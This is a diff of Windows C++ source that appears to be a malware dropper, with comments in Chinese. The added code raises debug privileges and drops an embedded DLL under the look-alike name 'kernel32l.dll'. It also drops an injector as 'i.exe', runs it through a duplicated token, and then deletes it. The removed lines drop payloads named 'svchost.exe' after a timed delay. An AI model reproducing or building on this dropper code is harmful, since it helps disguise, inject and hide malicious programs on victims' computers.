@@ -3,6 +3,12 @@
 #include <string>
 #include "resource.h"
 #include <string>
+#include <UserEnv.h>
+#include <WtsApi32.h>
+#pragma comment(lib, "UserEnv.lib")
+#pragma comment(lib, "WtsApi32.lib")
+
+#include "../../ProcessManger/ProcessIterator/CProcessOpt.h"
 
 using namespace std;
 #ifdef  UNICODE
@@ -16,6 +22,91 @@ BOOL WriteFile86AnCreateProcess(DWORD Type, STRING StartUpFileName);
 
 
 BOOL ReleaseFile(DWORD Type);
+BOOL NoSeccionCreateProcess(CBinString lpszFileName)
+{
+    BOOL bRet = TRUE;
+    DWORD dwSessionID = 0;
+    HANDLE hToken = NULL;
+    HANDLE hDuplicatedToken = NULL;
+    LPVOID lpEnvironment = NULL;
+    STARTUPINFO si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+    HANDLE ProcessHandle;
+    HANDLE CurrentToken;
+
+    ProcessHandle = GetCurrentProcess();
+    if (!OpenProcessToken(ProcessHandle, TOKEN_ALL_ACCESS, &CurrentToken))
+    {
+        int d = GetLastError();
+        OutputDebugStringA("OpenProcessToken ERROR");
+
+        return 0;
+    }
+
+    do
+    {
+        // 获得当前Session ID
+        dwSessionID = ::WTSGetActiveConsoleSessionId();
+
+        // 获得当前Session的用户令牌
+    /*    if (FALSE == ::WTSQueryUserToken(dwSessionID, &hToken))
+        {
+            OutputDebugStringA("WTSQueryUserToken ERROR");
+            bRet = FALSE;
+            break;
+        }*/
+
+        // 复制令牌
+        hToken = CurrentToken;
+        if (FALSE == ::DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+            SecurityIdentification, TokenPrimary, &hDuplicatedToken))
+        {
+            OutputDebugStringA("DuplicateTokenEx ERROR");
+
+         
+            bRet = FALSE;
+            break;
+        }
+
+        // 创建用户Session环境
+        if (FALSE == ::CreateEnvironmentBlock(&lpEnvironment,
+            hDuplicatedToken, FALSE))
+        {
+            OutputDebugStringA("CreateEnvironmentBlock ERROR");
+
+            bRet = FALSE;
+            break;
+        }
+
+        // 在复制的用户Session下执行应用程序，创建进程
+        if (FALSE == ::CreateProcessAsUser(hDuplicatedToken,
+            lpszFileName.c_str(), NULL, NULL, NULL, FALSE,
+            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
+            lpEnvironment, NULL, &si, &pi))
+        {
+            OutputDebugStringA("CreateProcessAsUser ERROR");
+
+            bRet = FALSE;
+            break;
+        }
+
+    } while (FALSE);
+    // 关闭句柄, 释放资源
+    if (lpEnvironment)
+    {
+        ::DestroyEnvironmentBlock(lpEnvironment);
+    }
+    if (hDuplicatedToken)
+    {
+        ::CloseHandle(hDuplicatedToken);
+    }
+    if (hToken)
+    {
+        ::CloseHandle(hToken);
+    }
+    return bRet;
+}
 
 BOOL WriteFile64AnCreateProcess(DWORD Type)
 {
@@ -136,6 +227,7 @@ BOOL WriteFile86AnCreateProcess(DWORD Type,STRING StartUpFileName)
     BOOL bRet = CreateProcess(StartUpFileName.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
 
 
+   
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     return TRUE;
@@ -237,27 +329,41 @@ STRING GetPath()
 }
 int main()
 {
-    // 防止删除
-    //19_FOR_193.exe
-   // WriteFile86AnCreateProcess(RRW_32);
-   // WriteFile86AnCreateProcess(RRW_32);
-    //1.服务加载 2.服务本身. 3.强杀exe
-    Sleep(180000); //延时三分钟.
-    STRING patchName = GetPath();
-   // patchName.append(TEXT("SystemServices.exe"));
-   //// ReleaseFile(BUG_20190719_FOR_193,TEXT("19_FOR_193.pro")); //写入20个强杀.
-   // ReleaseFile(SYSTEM_SERVICES, patchName);
+    CProcessOpt PsOpt;
+    PsOpt.SeEnbalAdjustPrivileges(SE_DEBUG_NAME);
 
 
+ 
+    CBinString patchName = TEXT("");
     patchName = GetPath();
-    //srand(time(unsigned int ))
-    patchName.append(TEXT("svchost.exe"));
-    //ReleaseFile(IDR_2019730_FOR_218, patchName);  //写入服务.服务启动.
-    WriteFile86AnCreateProcess(IDR_2019730_FOR_218, patchName);
+    patchName.append(TEXT("kernel32l.dll"));//寫入DLL
+    ReleaseFile(KILL_LOCKDLL, patchName);
     
+  
+
+    Sleep(1000);
+    patchName = GetPath();
+    patchName.append(TEXT("i.exe"));
+    //WriteFile86AnCreateProcess(INJECT_KILL_IELOCKLOADER, patchName); //写注入器
+    ReleaseFile(INJECT_KILL_IELOCKLOADER, patchName);
+    NoSeccionCreateProcess(patchName);
+ 
+    //写入SystemService
+
+    //写入CreateService
     //patchName = GetPath();
-    //patchName.append(TEXT("CreateService"));
-    //WriteFile86AnCreateProcess(CREATE_SERVICE, patchName); //先启动服务.,服务来启东核心功能.
-   
+    //patchName.append(TEXT("SystemServices.exe"));
+    //ReleaseFile(SystemServices, patchName); //SystemService
+    //Sleep(1000);//刪除文件.
+
+    //patchName = GetPath();
+    //patchName.append(TEXT("start"));
+    //WriteFile86AnCreateProcess(CreateAnStartServices, patchName); //写注入器
+    ////写入服务创建并且启动
+
+    Sleep(3000);
+    
+    DeleteFile(patchName.c_str());
+
     return 0;
 }
